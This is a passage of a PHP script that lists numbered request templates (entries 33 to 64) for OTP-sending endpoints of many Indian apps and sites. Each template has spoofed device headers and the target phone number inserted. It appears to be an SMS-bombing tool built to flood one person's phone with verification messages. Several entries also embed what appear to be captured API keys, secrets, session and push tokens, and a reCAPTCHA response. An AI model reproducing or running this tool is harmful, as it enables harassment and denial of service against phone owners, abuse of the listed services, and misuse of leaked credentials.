                    "mobile" => "+91" . $mobile,
                    "otp" => "",
                    "type" => "signup",
                    "referBy" => ""
                ])
            ],
            
            // 33. MxPlayer
            [
                "name" => "33. MxPlayer OTP",
                "url" => "https://api.mxplayer.in/v1/account/sms?phoneNumber=%2B91" . $mobile . "&messageType=message&language=en&device-density=2&userid=756a18de-6ac7-4cf3-b6e1-06d214b9540c&platform=com.mxplay.mobile&content-languages=hi%2Cen&kids-mode-enabled=false",
                "headers" => [
                    "Content-Type: application/json",
                    "Accept: application/json, text/plain, */*",
                    "User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; RMX3081 Build/RKQ1.211119.001)",
                    "Host: api.mxplayer.in",
                    "Connection: Keep-Alive",
                    "Accept-Encoding: gzip"
                ],
                "data" => json_encode([
                    "requestBody" => "ol3/+CjUwtOMa6ZRP3acPQ=="
                ])
            ],
            
            // 34. Apna
            [
                "name" => "34. Apna OTP",
                "url" => "https://production.apna.co/api/userprofile/v1/otp/",
                "headers" => [
                    "Content-Type: application/json",
                    "Accept: application/json, text/plain, */*",
                    "User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; RMX3081 Build/RKQ1.211119.001)",
                    "Host: production.apna.co",
                    "Connection: Keep-Alive",
                    "Accept-Encoding: gzip"
                ],
                "data" => json_encode([
                    "phone_number" => "91" . $mobile,
                    "retries" => 0,
                    "hash_type" => "employer",
                    "source" => "employer"
                ])
            ],
            
            // 35. GetLokal
            [
                "name" => "35. GetLokal OTP",
                "url" => "https://api.getlokalapp.com/login/otp/generate/",
                "headers" => [
                    "Content-Type: application/json",
                    "Accept: application/json, text/plain, */*",
                    "User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; RMX3081 Build/RKQ1.211119.001)",
                    "Host: api.getlokalapp.com",
                    "Connection: Keep-Alive",
                    "Accept-Encoding: gzip"
                ],
                "data" => json_encode([
                    "mobile_no" => $mobile
                ])
            ],
            
            // 36. Zee5
            [
                "name" => "36. Zee5 OTP",
                "url" => "https://auth.zee5.com/v1/user/sendotp",
                "headers" => [
                    "Host: auth.zee5.com",
                    "sec-ch-ua: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"",
                    "device_id: a5oabdM77HHnUp8wmUt6000000000000",
                    "sec-ch-ua-mobile: ?1",
                    "User-Agent: Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
                    "Content-Type: application/json",
                    "Accept: application/json",
                    "sec-ch-ua-platform: \"Android\"",
                    "Origin: https://www.zee5.com",
                    "Sec-Fetch-Site: same-site",
                    "Sec-Fetch-Mode: cors",
                    "Sec-Fetch-Dest: empty",
                    "Referer: https://www.zee5.com/",
                    "Accept-Encoding: gzip, deflate, br",
                    "Accept-Language: en-US,en;q=0.9,hi;q=0.8",
                    "Connection: Keep-Alive"
                ],
                "data" => json_encode([
                    "phoneno" => "91" . $mobile
                ])
            ],
            
            // 37. Dream11
            [
                "name" => "37. Dream11 OTP",
                "url" => "https://www.dream11.com/auth/passwordless/init",
                "headers" => [
                    "Host: www.dream11.com",
                    "Sec-Ch-UA: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"",
                    "Sec-Ch-UA-Mobile: ?1",
                    "User-Agent: Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
                    "Content-Type: application/json",
                    "Accept: application/json, text/plain, */*",
                    "X-Device-Identifier: macos",
                    "Device: pwa",
                    "Sec-Ch-UA-Platform: \"Android\"",
                    "Origin: https://www.dream11.com",
                    "Sec-Fetch-Site: same-origin",
                    "Sec-Fetch-Mode: cors",
                    "Sec-Fetch-Dest: empty",
                    "Referer: https://www.dream11.com/login",
                    "Accept-Encoding: gzip, deflate, br",
                    "Accept-Language: en-US,en;q=0.9,hi;q=0.8",
                    "Connection: Keep-Alive"
                ],
                "data" => json_encode([
                    "channel" => "sms",
                    "flow" => "SIGNIN",
                    "phoneNumber" => $mobile,
                    "templateName" => "default"
                ])
            ],
            
            // 38. ShemarooMe
            [
                "name" => "38. ShemarooMe OTP",
                "url" => "https://www.shemaroome.com/users/mobile_no_signup",
                "headers" => [
                    "Host: www.shemaroome.com",
                    "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
                    "X-Requested-With: XMLHttpRequest",
                    "User-Agent: Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
                    "Origin: https://www.shemaroome.com",
                    "Referer: https://www.shemaroome.com/",
                    "Accept-Encoding: gzip, deflate, br",
                    "Accept-Language: en-US,en;q=0.9,hi;q=0.8",
                    "Connection: Keep-Alive"
                ],
                "data" => "mobile_no=%2B91" . $mobile . "&registration_source="
            ],
            
            // 39. LoveLocal
            [
                "name" => "39. LoveLocal OTP",
                "url" => "https://homedeliverybackend.mpaani.com/auth/send-otp",
                "headers" => [
                    "Host: homedeliverybackend.mpaani.com",
                    "Connection: keep-alive",
                    "Sec-Ch-UA: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"",
                    "Accept-Language: en",
                    "Sec-Ch-UA-Mobile: ?1",
                    "Client-Code: vulpix",
                    "User-Agent: Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
                    "Content-Type: application/json",
                    "Accept: application/json, text/plain, */*",
                    "X-Access-Token: ",
                    "Sec-Ch-UA-Platform: \"Android\"",
                    "Origin: https://www.lovelocal.in",
                    "Sec-Fetch-Site: cross-site",
                    "Sec-Fetch-Mode: cors",
                    "Sec-Fetch-Dest: empty",
                    "Referer: https://www.lovelocal.in/",
                    "Accept-Encoding: gzip, deflate, br"
                ],
                "data" => json_encode([
                    "phone_number" => $mobile,
                    "role" => "CUSTOMER"
                ])
            ],
            
            // 40. Boat
            [
                "name" => "40. Boat OTP",
                "url" => "https://otp.boat-lifestyle.com/login/sendotp",
                "headers" => [
                    "Content-Type: application/json",
                    "Accept: application/json",
                    "User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; RMX3081 Build/RKQ1.211119.001)",
                    "Host: otp.boat-lifestyle.com",
                    "Connection: Keep-Alive",
                    "Accept-Encoding: gzip"
                ],
                "data" => json_encode([
                    "phone" => $mobile
                ])
            ],
            
            // 41. My11Circle
            [
                "name" => "41. My11Circle OTP",
                "url" => "https://www.my11circle.com/api/fl/auth/v3/getOtp",
                "headers" => [
                    "Content-Type: application/json",
                    "Accept: application/json",
                    "User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; RMX3081 Build/RKQ1.211119.001)",
                    "Host: www.my11circle.com",
                    "Connection: Keep-Alive",
                    "Accept-Encoding: gzip"
                ],
                "data" => json_encode([
                    "email" => "",
                    "mobile" => $mobile,
                    "geoLocState" => "",
                    "state" => "",
                    "nae" => [
                        "gaid" => "7521f72d-8551-45dd-ba1f-8f4f9db8d7f2",
                        "appVersion" => "11100.57",
                        "clientTime" => 1705841707005,
                        "dpi" => 0,
                        "deviceId" => "94cd8781003acb83",
                        "isDeviceRooted" => 0,
                        "limitAdwrdsTrckngStatus" => "0",
                        "os" => "Android",
                        "osVersion" => "10",
                        "screenSize" => 6,
                        "utmParams" => [
                            "reqQueryParams" => [
                                "af_status" => "Organic",
                                "af_message" => "organic install",
                                "is_first_launch" => true
                            ]
                        ],
                        "dataSent" => true,
                        "install_flag" => 1,
                        "distribution_medium" => "PLAYSTORE",
                        "gcmId" => "dxQxYysTSga0UKkB1R_CKC:APA91bELF6vIwgJ_COsLPEgNXLAKZYEu173Ua50vzXzWW4bTn6ACm9oSYBJa2fcv8aVRY3cyNBIOwtgiXf8FM0qGBBBGu0tHAys73g8tv_pHMgu3rum0hlxRU58_6p2j_MLZ43qNvLtp",
                        "connection_type" => "NETWORK_TYPE_LTE",
                        "channelId" => "2003",
                        "appsflyerId" => "1705841696708-2585565613944362248",
                        "action" => "getNaeAttribution"
                    ],
                    "whatsappAlerts" => true
                ])
            ],
            
            // 42. Eight
            [
                "name" => "42. Eight OTP",
                "url" => "https://prod-eight-apis-1.api.eight.network/api/send/otp",
                "headers" => [
                    "Content-Type: application/json",
                    "Accept: application/json",
                    "User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; RMX3081 Build/RKQ1.211119.001)",
                    "Host: prod-eight-apis-1.api.eight.network",
                    "Connection: Keep-Alive",
                    "Accept-Encoding: gzip"
                ],
                "data" => json_encode([
                    "phone" => $mobile
                ])
            ],
            
            // 43. Ce11
            [
                "name" => "43. Ce11 OTP",
                "url" => "https://ce11api.com/auth/loginV2",
                "headers" => [
                    "Content-Type: application/json",
                    "Accept: application/json",
                    "User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; RMX3081 Build/RKQ1.211119.001)",
                    "Host: ce11api.com",
                    "Connection: Keep-Alive",
                    "Accept-Encoding: gzip"
                ],
                "data" => json_encode([
                    "platform" => "8",
                    "num" => $mobile,
                    "apk_version" => "80",
                    "device" => "94cd8782a2671afb",
                    "token" => "58a70cbdc013e738fbf35b77d8afb128d8b0a714b85b8a44576336d8b6ac3bcf"
                ])
            ],
            
            // 44. FantasyAkhada
            [
                "name" => "44. FantasyAkhada OTP",
                "url" => "https://gu.fantasyakhada.com/user/login",
                "headers" => [
                    "Host: gu.fantasyakhada.com",
                    "Accept: application/json, text/plain, */*",
                    "Content-Type: application/json",
                    "Accept-Encoding: gzip",
                    "User-Agent: okhttp/4.9.2",
                    "Connection: Keep-Alive"
                ],
                "data" => json_encode([
                    "phone_no" => $mobile,
                    "device_id" => "94cd878769fb7c82",
                    "device_type" => "11",
                    "phone_code" => "91",
                    "source" => "",
                    "device" => [
                        "version" => "6.5",
                        "device_name" => "OPPO 2021",
                        "device_model" => "10",
                        "memory" => "1921437696",
                        "brand" => "OPPO",
                        "app_version" => "6.5"
                    ],
                    "loginMandate" => true
                ])
            ],
            
            // 45. WakeFit
            [
                "name" => "45. WakeFit OTP",
                "url" => "https://api.wakefit.co/api/consumer-sms-otp/",
                "headers" => [
                    "Host: api.wakefit.co",
                    "sec-ch-ua: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"",
                    "api-secret-key: ycq55IbIjkLb",
                    "sec-ch-ua-mobile: ?1",
                    "user-agent: Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
                    "content-type: application/json",
                    "accept: application/json, text/plain, */*",
                    "api-token: c84d563b77441d784dce71323f69eb42",
                    "sec-ch-ua-platform: \"Android\"",
                    "origin: https://www.wakefit.co",
                    "sec-fetch-site: same-site",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "referer: https://www.wakefit.co/",
                    "accept-encoding: gzip, deflate, br",
                    "accept-language: en-US,en;q=0.9,hi;q=0.8",
                    "Connection: Keep-Alive"
                ],
                "data" => json_encode([
                    "mobile" => $mobile,
                    "whatsapp_opt_in" => 1
                ])
            ],
            
            // 46. CarDekho
            [
                "name" => "46. CarDekho OTP",
                "url" => "https://apis.cardekho.com/f8",
                "headers" => [
                    "secret: 626632cd9618477eee6d46e0",
                    "appversioncode: 302",
                    "appversion: 7.2.1.9",
                    "platform: app_android",
                    "content-type: application/json; charset=UTF-8",
                    "accept-encoding: gzip",
                    "user-agent: okhttp/4.8.0",
                    "Connection: Keep-Alive",
                    "Host: apis.cardekho.com"
                ],
                "data" => json_encode([
                    "variables" => [
                        "payload" => [
                            "utmParams" => [
                                "source" => "google-play",
                                "medium" => "organic"
                            ],
                            "connectoid" => "7521f72d-8551-45dd-ba1f-8f4f9db8d7f2",
                            "intentSource" => "OnBoarding",
                            "mobile" => $mobile,
                            "waOtp" => false,
                            "platform" => "app_android"
                        ]
                    ],
                    "query" => "mutation SendOtp(\$payload: UserInput!) {\n  sendOtp(payload: \$payload) {\n    token\n    name\n    existingUser\n    whatsappOptIn\n    __typename\n  }\n}\n",
                    "operationName" => "SendOtp"
                ])
            ],
            
            // 47. Hyuga
            [
                "name" => "47. Hyuga OTP",
                "url" => "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate",
                "headers" => [
                    "Content-Type: application/json; charset=UTF-8",
                    "User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; RMX3081 Build/RKQ1.211119.001)",
                    "Host: hyuga-auth-service.pratech.live",
                    "Connection: Keep-Alive",
                    "Accept-Encoding: gzip"
                ],
                "data" => json_encode([
                    "mobile_number" => $mobile
                ])
            ],
            
            // 48. AbhiBus
            [
                "name" => "48. AbhiBus OTP",
                "url" => "https://www.abhibus.com/app/v72/sendOtp",
                "headers" => [
                    "IMEI: ecad72a394a9d9b0",
                    "Content-Type: application/json; charset=UTF-8",
                    "Host: www.abhibus.com",
                    "Connection: Keep-Alive",
                    "Accept-Encoding: gzip",
                    "User-Agent: okhttp/4.9.2"
                ],
                "data" => json_encode([
                    "cleverTapUserId" => "__g7521f72d855145ddba1f8f4f9db8d7f2",
                    "deviceToken" => "cCBClbNaQx-bCkkCgaxzpX:APA91bEFyWluYuuLN9Dkod11w4FOt1X3_pe25oy_-ASEb9XdZsAWsNeaciI1zWkqMAC900wDd-gLoFHbM5I9EuM37viTF7vuxzmQMhNOoIw2Mz44q-j9oc8qnXxwU3TM0KWebYdB01y1",
                    "mobile" => $mobile,
                    "prd" => "ANDR",
                    "pushToken" => "cCBClbNaQx-bCkkCgaxzpX:APA91bEFyWluYuuLN9Dkod11w4FOt1X3_pe25oy_-ASEb9XdZsAWsNeaciI1zWkqMAC900wDd-gLoFHbM5I9EuM37viTF7vuxzmQMhNOoIw2Mz44q-j9oc8qnXxwU3TM0KWebYdB01y1"
                ])
            ],
            
            // 49. RoyalEnfield
            [
                "name" => "49. RoyalEnfield OTP",
                "url" => "https://api.royalenfield.com/v3/app/sendLoginAndProfileUpdateOtp",
                "headers" => [
                    "app_id: 2",
                    "x-custom-language: en",
                    "x-custom-country: in",
                    "Content-Type: application/json; charset=UTF-8",
                    "Host: api.royalenfield.com",
                    "Connection: Keep-Alive",
                    "Accept-Encoding: gzip",
                    "User-Agent: okhttp/4.2.1"
                ],
                "data" => json_encode([
                    "callingCode" => "91",
                    "email" => "",
                    "mobile" => $mobile,
                    "otpExpirationTime" => 30,
                    "otpType" => 0
                ])
            ],
            
            // 50. Zomato
            [
                "name" => "50. Zomato OTP",
                "url" => "https://accounts.zomato.com/login/phone",
                "headers" => [
                    "Content-Type: application/x-www-form-urlencoded",
                    "Connection: Keep-Alive",
                    "Accept-Encoding: gzip",
                    "User-Agent: okhttp/4.9.2",
                    "Host: accounts.zomato.com"
                ],
                "data" => "number=" . $mobile . "&country_id=1&lc=030257f739274b629ff093b913e3f004&type=initiate&verification_type=sms&package_name=&message_uuid="
            ],
            
            // 51. Zepto
            [
                "name" => "51. Zepto OTP",
                "url" => "https://api.zepto.co.in/api/v1/user/customer/signup/",
                "headers" => [
                    "accept: application/json",
                    "access-control-allow-credentials: true",
                    "x-requested-with: XMLHttpRequest",
                    "sessionid: 1bbf4273e4838fb39d548b5e065137e1",
                    "appversion: 24.1.2",
                    "deviceuid: ecad72a394a9d9b0",
                    "platform: android",
                    "systemversion: 13",
                    "source: PLAY_STORE",
                    "device_model: Oppo",
                    "device_brand: Oppo",
                    "compatible_components: SAMPLING_FOR_COUPON_MOV_ENABLED,CONVENIENCE_FEE,RAIN_FEE,EXTERNAL_COUPONS,STANDSTILL,BUNDLE,MULTI_SELLER_ENABLED,PIP_V1,ROLLUPS,SAMPLING_ENABLED,ETA_NORMAL_WITH_149_DELIVERY,ROLLUPS_UOM,SAMPLING_V2,RE_PROMISE_ETA_ORDER_SCREEN_ENABLED,RECOMMENDED_COUPON_WIDGET,SMART_BASKET,NZS_CAMPAIGN_COMPONENT,ETA_NORMAL_WITH_199_DELIVERY,NEW_FEE_STRUCTURE,PHARMA_ENABLED,REWARDS_WIDGET_MISSION_V2,GAMIFICATION_ENABLED,DYNAMIC_FILTERS,HOMEPAGE_V2,COUPON_WIDGET_CART_REVAMP,AUTOSUGGESTION_PIP,NEW_ETA_BANNER,CART_TABBED_WIDGET,BPC_GROUP_DETAILS,IS_DYNAMIC_NZS_SUPPORTED,ZEPTO_THREE,RERANKING_QCL_RELATED_PRODUCTS,AUTO_COD_ORDER_ENABLED,PAAN_BANNER_WIDGETIZED,FTB_SINGLE_CLICK_COD_PAYMENT,AUTOSUGGESTION_PAGE_ENABLED,COUPON_UPSELLING_WIDGET,DELIVERY_UPSELLING_WIDGET,CART_BOX_MODEL_WIDGETS,REFERRAL_P2,PDP_TOP_PRODUCT_BANNER,AUTOSUGGESTION_AD_PIP,VERTICAL_FEED_PRODUCT_GRID",
                    "storeid: a2af220f-8ad2-4869-abc7-62dc2476af8c",
                    "tobaccoconsentgiven: false",
                    "isinternaluser: false",
                    "requestid: 015fb21846b25a35232a27271039c52c",
                    "bundleversion: ",
                    "is_new_font: true",
                    "accept-encoding: gzip",
                    "content-type: application/json; charset=utf-8",
                    "user-agent: okhttp/4.9.3",
                    "Host: api.zepto.co.in",
                    "Connection: Keep-Alive"
                ],
                "data" => json_encode([
                    "signupType" => "otp_sms",
                    "data" => [
                        "mobile_number" => $mobile
                    ]
                ])
            ],
            
            // 52. Faasos
            [
                "name" => "52. Faasos OTP",
                "url" => "https://thanos.faasos.io/v3/customer/generate_otp.json",
                "headers" => [
                    "Host: thanos.faasos.io",
                    "client-source: 13",
                    "brand-id: 134",
                    "app-version: 10244",
                    "client-os: eatsure_android",
                    "content-type: application/json; charset=UTF-8",
                    "accept-encoding: gzip",
                    "user-agent: okhttp/4.10.0",
                    "Connection: Keep-Alive"
                ],
                "data" => json_encode([
                    "phone_number" => $mobile,
                    "country_code" => "IND",
                    "dialing_code" => "+91",
                    "is_new_customer" => true,
                    "communication_channel" => "sms"
                ])
            ],
            
            // 53. TataDigital
            [
                "name" => "53. TataDigital OTP",
                "url" => "https://api.tatadigital.com/api/v2/sso/check-phone",
                "headers" => [
                    "Host: api.tatadigital.com",
                    "client_id: TATACLIQ-ANDROID-APP",
                    "appversion: 80",
                    "appplatform: android",
                    "content-type: application/json; charset=UTF-8",
                    "accept-encoding: gzip",
                    "user-agent: okhttp/4.11.0",
                    "Connection: Keep-Alive"
                ],
                "data" => json_encode([
                    "countryCode" => "91",
                    "phone" => $mobile,
                    "sendOtp" => true
                ])
            ],
            
            // 54. HealthKart
            [
                "name" => "54. HealthKart OTP",
                "url" => "https://www.healthkart.com/veronica/user/validate/1/" . $mobile . "/signup?plt=2&st=1",
                "headers" => [
                    "User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; RMX3081 Build/RKQ1.211119.001)",
                    "Host: www.healthkart.com",
                    "Connection: Keep-Alive",
                    "Accept-Encoding: gzip"
                ],
                "data" => null,
                "method" => "GET"
            ],
            
            // 55. TheSirona
            [
                "name" => "55. TheSirona OTP",
                "url" => "https://acl.mgapis.com/v6/otp/generate?vendorCode=srn&countryFilter=IND&languageFilter=EN",
                "headers" => [
                    "G-Recaptcha-Action: sendOtp",
                    "Sec-Ch-Ua-Mobile: ?1",
                    "G-Recaptcha-Response: 03AFcWeA5KLRLbxYnTPiII_SHZuyFf85KNL-nJpWl1ekVmjt9iH-aSL1YrkoBtLH0e_k-Gs3tMxjQhFvljB4VXx85JU-EgXdE8ETEichHsrXGGWOYdQ5qqxBrlaTs1aLuAHYNvUeO1O3c41ELEPbuYvf58crIkdXA0nJqtaG3XeyfoGqEtVIX-dhoXFfoqLrriEmOYdI3Kml4sFJg3dGrkZGAbGxQZaUjANbuZfkjFODbbh5Bm0B48BrTIn3Q-VT6HHY9jSmZMn1KeSvlcdKi5CyUxDIm12ehwd5c6ro7fiH90QD3Kh43bVJu7NWpOdgpAUkx61JGhtK4xOwi2FXg2LLb3paCb2VOcXhVW0HCiiE7BOJFJmAcbcksHUA9Ls6454aymofW5KZoSfECbgWLKS2VysBheX9RClwbnQ9vrMxAWLx50X_lCs0iGFKEhLzU0_HTW4VUK47tPj1k9n8xO3WmeRfwJ7TLH2RkzL0A-FQjDMIMH16_qfFZkU9PpwkqmGxRpF1eGXOcIs7BqwhxhzXcTR0gl3hsKf4L6urPstreScgAUAn9O-JiCWZD09oTWN9fvZNP2sTna_jN2tAKyPqRguJm0CRu2r-cSD-_4hz0ccLg4UfP3N2VFtMOnM1vguo5ufiUmyjvx70psFfBtGc8nssslOnIH4zFPqXpps_rJH17rWFqBhStwhsxr-hP8mDqNmUPMPa5oRSTce11cuoBFz3xQsv6Z_JKGgRFFx25dPrsXxISZSH1lyufFRh_6VPLkkcMzUWYH-QuddP70_ySQBGVSThtMrCQWhduH498s87b1r7nsvXPal8my0ebvcijoBgxbH9vO6NBDyH-2sg1R7vlSpRY8f2phf9Bw0ZmP6nuiWigR_y8y9hmRMVNtbmSFadgsXNYDvyt3ziMENWRIj2Awjp7ou3jFTsQxetKKFl0x5Q99onKfFNpb144drfwI332asCCJ9VwKjiU4TE0f56LOsW4_UJbALP0v2hyPUBT-2nvr_f1Z2Ev998oBRSJvYLxjGgPgM16xJ4qapki711B5WnFBzmnwNkWlCGXJmWEvwr1oodCpm5pCfGb0GqcBKQwQh-wtVmKHYQY2ECo8iUlliDYsudkbuWNJX74VYrCOvwJSKUIUfb_2NKjzj-pKevBp0rEI55y_B3NjVWq2lIzO8vgOcLtwyCkXKCZCDBsrp9s_yRMse2aTeMq3myoQCdb_cBcVZWtK_f5kvkrn9psuhIuYr2uPELFPd058k-GZjU2nEYugsZKjcQ1102IXWCzMzvyJy9YSqW5BmgMjQxlEQOEn60bmPP7NvdnE1TSeOeV9FYpb149t87OzKNfsj3ZWSQozUdZ4C1sbvCMxUDZPp4JKoxbsDvT_3buMa6uYUH1j8kh3eBftMG_BUrTR5Gc42Uwz0J7ACQ6ZEF0jmtwvDtwZbdjr4TmHM3d7Fua38axcJPA7LziHrfMYhqq-4jS-wfDY1A06u1CsKs-MKYmrv8rE1VAoTMde9x--iV8mFrEwTSlHqrKNm1c1Qyz141YP0cSGZOjsajEiYmPsP2gmdoJ2SeKWz5bXizC-V5B7pjVBem0NlQVQuhQAtES5JRCrH_BJyYJTKlBbAlwQqJjSbAYM_zumhLz6vKZtValATfrt-CErS20EWibMgcVJiVpOlfh1BSA4QAoaWi1OCUOVLEH3FQ",
                    "User-Agent: Mozilla/5.0 (Linux; Android 10; OPPO Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
                    "Content-Type: application/json",
                    "Accept: application/json, text/plain, */*",
                    "ApiKey: 7f6ced1f4265ebfd4ca89a9d8a3b8bb5",
                    "Sec-Ch-Ua-Platform: Android",
                    "Origin: https://www.thesirona.com",
                    "X-Requested-With: mark.via.gp",
                    "Sec-Fetch-Site: cross-site",
                    "Sec-Fetch-Mode: cors",
                    "Sec-Fetch-Dest: empty",
                    "Referer: https://www.thesirona.com/",
                    "Accept-Encoding: gzip, deflate, br",
                    "Accept-Language: en-US,en;q=0.9",
                    "Connection: Keep-Alive"
                ],
                "data" => json_encode([
                    "countryCode" => "91",
                    "mobile" => $mobile,
                    "isWhatsAppOpted" => null,
                    "name" => "",
                    "vendorCode" => "srn"
                ])
            ],
            
            // 56. BarbequeNation
            [
                "name" => "56. BarbequeNation OTP",
                "url" => "https://api.barbequenation.com/api/v1/generate-otp",
                "headers" => [
                    "Host: api.barbequenation.com",
                    "bbq-client-id: ab152980-a81b-4b99-aef9-e5786a0923f4",
                    "bbq-client-secret: zonvYz-xawgih-vodno5",
                    "user-agent: Android-ecad72a394a9d9b0",
                    "content-type: application/json; charset=UTF-8",
                    "accept-encoding: gzip",
                    "Connection: Keep-Alive"
                ],
                "data" => json_encode([
                    "country_code" => "+91",
                    "mobile_number" => $mobile,
                    "otp_id" => ""
                ])
            ],
            
            // 57. CountryDelight
            [
                "name" => "57. CountryDelight OTP",
                "url" => "https://api.countrydelight.in/api/v1/customer/requestOtp",
                "headers" => [
                    "Content-Type: application/json; charset=UTF-8",
                    "Accept-Encoding: gzip",
                    "User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; RMX3081 Build/RKQ1.211119.001)",
                    "Host: api.countrydelight.in",
                    "Connection: Keep-Alive"
                ],
                "data" => json_encode([
                    "device" => "Android",
                    "mobile_number" => $mobile,
                    "mode" => "SMS",
                    "new_user" => false
                ])
            ],
            
            // 58. D2R
            [
                "name" => "58. D2R OTP",
                "url" => "https://asia-south1-op-d2r.cloudfunctions.net/sendOtp",
                "headers" => [
                    "Content-Type: application/json; charset=UTF-8",
                    "Accept-Encoding: gzip",
                    "User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; RMX3081 Build/RKQ1.211119.001)",
                    "Host: asia-south1-op-d2r.cloudfunctions.net",
                    "Connection: Keep-Alive"
                ],
                "data" => json_encode([
                    "data" => [
                        "appVersion" => "5.6.0",
                        "phoneNumber" => "+91" . $mobile,
                        "env" => "prod",
                        "isResend" => false
                    ]
                ])
            ],
            
            // 59. Bodhiness
            [
                "name" => "59. Bodhiness OTP",
                "url" => "https://api.bodhiness.com/v1/users/login?defaultCurrencyType=inr",
                "headers" => [
                    "Content-Type: application/json; charset=UTF-8",
                    "Accept-Encoding: gzip",
                    "User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; RMX3081 Build/RKQ1.211119.001)",
                    "Host: api.bodhiness.com",
                    "Connection: Keep-Alive"
                ],
                "data" => json_encode([
                    "countryCode" => "+91",
                    "phoneNumber" => $mobile,
                    "notifyByWhatsapp" => true,
                    "platform" => "WEB",
                    "onlyUserLogin" => true
                ])
            ],
            
            // 60. AstroSage
            [
                "name" => "60. AstroSage OTP",
                "url" => "https://varta.astrosage.com/sdk/registerAS?callback=myCallback&countrycode=91&phoneno=" . $mobile . "&deviceid=&jsonpcall=1&fromresend=0&operation_name=blank&_=1706752236109",
                "headers" => [
                    "Host: varta.astrosage.com",
                    "sec-ch-ua: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Android WebView\";v=\"120\"",
                    "sec-ch-ua-mobile: ?1",
                    "user-agent: Mozilla/5.0 (Linux; Android 13; OPPO Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
                    "sec-ch-ua-platform: \"Android\"",
                    "accept: */*",
                    "x-requested-with: mark.via.gp",
                    "sec-fetch-site: same-site",
                    "sec-fetch-mode: no-cors",
                    "sec-fetch-dest: script",
                    "referer: https://www.astrosage.com/",
                    "accept-encoding: gzip, deflate, br",
                    "accept-language: en-US,en;q=0.9",
                    "cookie: app-install=1",
                    "Connection: Keep-Alive"
                ],
                "data" => null,
                "method" => "GET"
            ],
            
            // 61. KisanKonnect
            [
                "name" => "61. KisanKonnect OTP",
                "url" => "https://api.kisankonnect.in/api/v2/customer-masters/generate-otp",
                "headers" => [
                    "Content-Type: application/json; charset=UTF-8",
                    "User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; RMX3081 Build/RKQ1.211119.001)",
                    "Host: api.kisankonnect.in",
                    "Connection: Keep-Alive",
                    "Accept-Encoding: gzip"
                ],
                "data" => json_encode([
                    "mobile_no" => $mobile
                ])
            ],
            
            // 62. MyPandit
            [
                "name" => "62. MyPandit OTP",
                "url" => "https://product.mypandit.com/wp-json/digits/v6/signup_user_popup",
                "headers" => [
                    "Content-Type: application/x-www-form-urlencoded",
                    "User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; RMX3081 Build/RKQ1.211119.001)",
                    "Host: product.mypandit.com",
                    "Connection: Keep-Alive",
                    "Accept-Encoding: gzip"
                ],
                "data" => "device_id=web&user_email=&country_code=%2B91&mobile_no=" . $mobile . "&device_type=web"
            ],
            
            // 63. InstaAstro
            [
                "name" => "63. InstaAstro OTP",
                "url" => "https://instaastro.com/v1/users/website-phone-login/login/",
                "headers" => [
                    "Host: instaastro.com",
                    "sec-ch-ua: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Android WebView\";v=\"120\"",
                    "Accept: */*",
                    "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
                    "x-requested-with: XMLHttpRequest",
                    "sec-ch-ua-mobile: ?1",
                    "User-Agent: Mozilla/5.0 (Linux; Android 13; OPPO Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
                    "sec-ch-ua-platform: \"Android\"",
                    "Origin: https://instaastro.com",
                    "sec-fetch-site: same-origin",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "Referer: https://instaastro.com/",
                    "Accept-Encoding: gzip, deflate, br",
                    "Accept-Language: en-US,en;q=0.9",
                    "Cookie: csrftoken=Q6sBuwOJQb5hHfwTtY5joqvZLo4eiuo9XOL2HGZaYJYW1Rew4Lf7Z3PoYkIu6K1m",
                    "Connection: Keep-Alive"
                ],
                "data" => "phone_number=%2B91" . $mobile . "&dynamic_api_key=aW5zdGEyMDIzd2Vi&csrfmiddlewaretoken=jfIaZnWVnBjelnt5J3yA1qtVSqfimYntqX1Bcx7mv9cTFZbIkQIoC3Nk5mTyae0D&g_recaptcha="
            ],
            
            // 64. GamerJi
            [
                "name" => "64. GamerJi OTP",
                "url" => "https://api.gamerji.tech/api/auth/signup",
                "headers" => [
                    "Host: api.gamerji.tech",
                    "sec-ch-ua: \"Not A(Brand\";v=\"99\", \"Android WebView\";v=\"121\", \"Chromium\";v=\"121\"",
